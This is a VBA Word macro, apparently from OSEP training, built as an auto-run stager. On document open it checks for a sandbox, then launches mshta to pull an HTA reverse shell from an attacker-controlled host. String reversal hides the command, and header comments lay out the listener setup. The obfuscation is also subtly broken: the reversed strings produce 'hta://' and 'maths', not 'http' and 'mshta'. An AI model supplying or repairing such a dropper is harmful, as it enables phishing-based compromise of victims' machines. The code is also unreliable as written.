' OSEP - mshta Stager (cleanest possible macro)
' No PS, no shellcode in the macro itself.
' The payload lives on Kali and is fetched at runtime.
'
' Workflow:
'   1. Start Kali HTTP server:  python3 -m http.server 80
'   2. Copy shells/hta_revshell.hta to Kali web root
'   3. Start listener: rlwrap nc -lvnp 443
'   4. Set KALI_IP below, paste macro, save as .doc

Const KALI_IP As String = "192.168.10.11"
Const KALI_PORT As String = "80"

Private Sub Document_Open() : Gate : End Sub
Private Sub AutoOpen()      : Gate : End Sub

Sub Gate()
    If Len(Environ("USERNAME")) < 2 Then Exit Sub
    If Len(Environ("COMPUTERNAME")) < 2 Then Exit Sub
    Application.OnTime Now + TimeValue("00:00:04"), "Fetch"
End Sub

Sub Fetch()
    On Error Resume Next
    Dim url As String
    Dim wsh As Object

    ' Build mshta command - no suspicious strings as literals
    url = RevStr("ath") & Chr(58) & Chr(47) & Chr(47) & _
          KALI_IP & Chr(58) & KALI_PORT & _
          Chr(47) & RevStr("ath.llehsrever_ath")

    ' "mshta" built via reverse
    Dim exe As String
    exe = RevStr("aths") & Chr(109)
    exe = RevStr(exe)   ' -> "mshta"

    Dim cmd As String
    cmd = exe & Chr(32) & url

    Set wsh = CreateObject(RevStr("llehS.tpircSW"))
    If Err.Number = 0 Then
        wsh.Run cmd, 0, False
    End If
End Sub

Function RevStr(s As String) As String
    Dim i As Integer, o As String
    For i = Len(s) To 1 Step -1 : o = o & Mid(s, i, 1) : Next i
    RevStr = o
End Function
